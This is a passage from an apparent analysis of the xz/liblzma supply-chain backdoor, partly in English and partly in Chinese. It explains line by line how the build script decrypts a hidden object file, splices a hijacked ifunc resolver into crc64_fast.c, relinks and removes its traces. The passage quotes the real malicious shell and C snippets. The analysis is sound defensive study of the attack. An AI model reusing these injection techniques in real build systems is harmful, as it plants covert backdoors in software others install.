    v=t["x" (NF<1?RS:$1)];
    i=(i+1)%m;a=c[i];j=(j+a)%m;b=c[j];c[i]=b;c[j]=a;k=c[(a+b)%m];
    printf "%c",(v+k)%m
}' |

```

I inserted another line break here. What is this? [@nugxperience on Twitter recognized it](https://twitter.com/nugxperience/status/1773906926503591970) as an RC4-like decryption function, implemented in awk! Apparently the `tr`-based substitution cipher wasn’t secure enough for this step. This is the 5.6.1 version; the 5.6.0 version is the same except that the second loop counts to 4096 instead of 8192.

Back to the script:

```
xz -dc --single-stream | ((head -c +$N > /dev/null 2>&1) && head -c +$W) > liblzma_la-crc64-fast.o || true

```

我们终于走到了这条长线的末端。解密的输出通过 xz 传输进行解压；`--single-stream` 标志指示停止在第一个 xz EOF 标记处，而不是在标准输入中寻找其他文件。这避免了读取之前用 `tail` 命令提取的输入部分。然后，解压的数据通过 `head` 对被抽取的完整的 88,792 字节输入或零字节进行了管道传输，并将其写入 `liblzma_la-crc64-fast.o`。在我们的构建中，我们接受了完整的输入。

```
if ! test -f liblzma_la-crc64-fast.o; then
exit 0
fi

```

如果所有这些都失败了，请静静地停止。

```
cp .libs/liblzma_la-crc64_fast.o .libs/liblzma_la-crc64-fast.o || true

```

等等？哦！注意两个不同的文件名 `crc64_fast` 和 `crc64-fast`。而且这两个都不是我们刚提取的那个文件。这些位于 `.libs/`，而我们提取的是在当前目录。这将实际文件（带有下划线的文件）备份到一个文件名非常相似的文件（带有连字符的文件）。

```
V='#endif\n#if defined(CRC32_GENERIC) && defined(CRC64_GENERIC) &&
    defined(CRC_X86_CLMUL) && defined(CRC_USE_IFUNC) && defined(PIC) &&
    (defined(BUILDING_CRC64_CLMUL) || defined(BUILDING_CRC32_CLMUL))\n
    extern int _get_cpuid(int, void*, void*, void*, void*, void*);\n
    static inline bool _is_arch_extension_supported(void) { int success = 1; uint32_t r[4];
    success = _get_cpuid(1, &r[0], &r[1], &r[2], &r[3], ((char*) __builtin_frame_address(0))-16);
    const uint32_t ecx_mask = (1 << 1) | (1 << 9) | (1 << 19);
    return success && (r[2] & ecx_mask) == ecx_mask; }\n
    #else\n
    #define _is_arch_extension_supported is_arch_extension_supported'

```

字符串 `$V` 以 “`#endif`” 开头，这绝不是一个好兆头。暂且不谈这个，我们稍后会仔细查看这段文本。

```
eval $yosA
if sed "/return is_arch_extension_supported()/ c\return _is_arch_extension_supported()" $top_srcdir/src/liblzma/check/crc64_fast.c | \
sed "/include \"crc_x86_clmul.h\"/a \\$V" | \
sed "1i # 0 \"$top_srcdir/src/liblzma/check/crc64_fast.c\"" 2>/dev/null | \
$CC $DEFS $DEFAULT_INCLUDES $INCLUDES $liblzma_la_CPPFLAGS $CPPFLAGS $AM_CFLAGS \
    $CFLAGS -r liblzma_la-crc64-fast.o -x c -  $P -o .libs/liblzma_la-crc64_fast.o 2>/dev/null; then

```

这个 `if` 语句正在运行一系列的 `sed` 命令管道传输到 `$CC`，参数是 `liblzma_la-crc64-fast.o`（将该对象作为编译器的输入）和 `-x` `c` `-`（从标准输入编译一个 C 程序）。也就是说，它重新构建了 `crc64_fast.c`（一个真实的 xz 源文件）的编辑副本，并将提取的恶意 `.o` 文件合并到结果对象中，覆盖了原本为 `crc64_fast.c` 构建的带有下划线的真实对象文件。`sed` `1i` 告诉编译器在调试信息中记录文件名，因为编译器正在读取标准输入——非常整洁！但是这些修改是什么呢？

文件一开始看起来是这样的：

```
...
#if defined(CRC_X86_CLMUL)
#   define BUILDING_CRC64_CLMUL
#   include "crc_x86_clmul.h"
#endif
...
static crc64_func_type
crc64_resolve(void)
{
    return is_arch_extension_supported()
            ? &crc64_arch_optimized : &crc64_generic;
}

```

`sed` 命令在返回条件中为函数名称添加了 `_` 前缀，然后在 `include` 行之后添加了 `$V`，经过 C 代码的重新格式化：

```
# 0 "path/to/src/liblzma/check/crc64_fast.c"
...
#if defined(CRC_X86_CLMUL)
#   define BUILDING_CRC64_CLMUL
#   include "crc_x86_clmul.h"
#endif

#if defined(CRC32_GENERIC) && defined(CRC64_GENERIC) && \
    defined(CRC_X86_CLMUL) && defined(CRC_USE_IFUNC) && defined(PIC) && \
    (defined(BUILDING_CRC64_CLMUL) || defined(BUILDING_CRC32_CLMUL))

extern int _get_cpuid(int, void*, void*, void*, void*, void*);

static inline bool _is_arch_extension_supported(void) {
    int success = 1;
    uint32_t r[4];
    success = _get_cpuid(1, &r[0], &r[1], &r[2], &r[3], ((char*) __builtin_frame_address(0))-16);
    const uint32_t ecx_mask = (1 << 1) | (1 << 9) | (1 << 19);
    return success && (r[2] & ecx_mask) == ecx_mask;
}

#else
#define _is_arch_extension_supported is_arch_extension_supported
#endif
...
static crc64_func_type
crc64_resolve(void)
{
    return _is_arch_extension_supported()
            ? &crc64_arch_optimized : &crc64_generic;
}

```

也就是说，crc64_resolve 函数，这是在动态加载早期运行的 ifunc 解析器，在 GOT 和 PLT 被标记为只读之前，现在调用了新插入的 `_is_arch_extension_supported`，后者调用了 `_get_cpuid`。这看起来仍然像是合理的代码，因为这与 [真实的 is_arch_extension_supported](https://git.tukaani.org/?p=xz.git;a=blob;f=src/liblzma/check/crc_x86_clmul.h;h=ae66ca9f8c710fd84cd8b0e6e52e7bbfb7df8c0f;hb=2d7d862e3ffa8cec4fd3fdffcd84e984a17aa429#l388) 非常相似。但是 `_get_cpuid` 是由后门的 .o 提供的，它在返回 cpuid 信息之前做了更多操作。特别是重新编写了 GOT 和 PLT 以劫持对 RSA_public_decrypt 的调用。

但是让我们回到 shell 脚本，它仍在从 `src/liblzma/Makefile` 内部运行，并且成功地将后门插入到 `.libs/liblzma_la-crc64_fast.o` 中。我们现在处于编译器成功的 `if` 情况：

```
cp .libs/liblzma_la-crc32_fast.o .libs/liblzma_la-crc32-fast.o || true
eval $BPep
if sed "/return is_arch_extension_supported()/ c\return _is_arch_extension_supported()" $top_srcdir/src/liblzma/check/crc32_fast.c | \
sed "/include \"crc32_arm64.h\"/a \\$V" | \
sed "1i # 0 \"$top_srcdir/src/liblzma/check/crc32_fast.c\"" 2>/dev/null | \
$CC $DEFS $DEFAULT_INCLUDES $INCLUDES $liblzma_la_CPPFLAGS $CPPFLAGS $AM_CFLAGS \
    $CFLAGS -r -x c -  $P -o .libs/liblzma_la-crc32_fast.o; then

```

这对 `crc32_fast.c` 做了同样的事情，只是它没有添加后门的目标代码。我们不希望在构建中有两份副本。不清楚为什么脚本要拦截 crc32 和 crc64 的 ifuncs；任何一个都应该足够了。也许他们希望两者在调试器中的调度代码看起来类似。现在我们进入了双重嵌套的编译器成功情况的 `if` 分支：

```
eval $RgYB
if $AM_V_CCLD$liblzma_la_LINK -rpath $libdir $liblzma_la_OBJECTS $liblzma_la_LIBADD; then

```

如果我们可以重新链接 .la 文件，那么...

```
if test ! -f .libs/liblzma.so; then
mv -f .libs/liblzma_la-crc32-fast.o .libs/liblzma_la-crc32_fast.o || true
mv -f .libs/liblzma_la-crc64-fast.o .libs/liblzma_la-crc64_fast.o || true
fi

```

如果重新链接成功但没有写入文件，则假设失败并恢复备份。

```
rm -fr .libs/liblzma.a .libs/liblzma.la .libs/liblzma.lai .libs/liblzma.so* || true

```

无论如何，删除库文件。（`Makefile`链接步骤预计会在接下来进行并重新创建它们。）

```
else
mv -f .libs/liblzma_la-crc32-fast.o .libs/liblzma_la-crc32_fast.o || true
mv -f .libs/liblzma_la-crc64-fast.o .libs/liblzma_la-crc64_fast.o || true
fi

```

这是链接失败的情况。从备份中恢复。

```
rm -f .libs/liblzma_la-crc32-fast.o || true
rm -f .libs/liblzma_la-crc64-fast.o || true

```

现在我们在内部编译器成功的情况。删除备份。

```
else
mv -f .libs/liblzma_la-crc32-fast.o .libs/liblzma_la-crc32_fast.o || true
mv -f .libs/liblzma_la-crc64-fast.o .libs/liblzma_la-crc64_fast.o || true
fi

```

这是 crc32 编译失败的情况。从备份中恢复。

```
else
mv -f .libs/liblzma_la-crc64-fast.o .libs/liblzma_la-crc64_fast.o || true
fi

```

这是 crc64 编译失败的情况。从备份中恢复。（这不是世界上最干净的 shell 脚本！）

```
rm -f liblzma_la-crc64-fast.o || true

```

现在我们到了脚本的 Makefile 部分的结尾。删除备份。

```
fi
eval $DHLd
$

```

关闭“`elif`我们在一个 Makefile 中”的分支，再加一个扩展点/调试打印，我们完成了！脚本已将目标文件注入到`make`期间构建的对象中，不留痕迹。
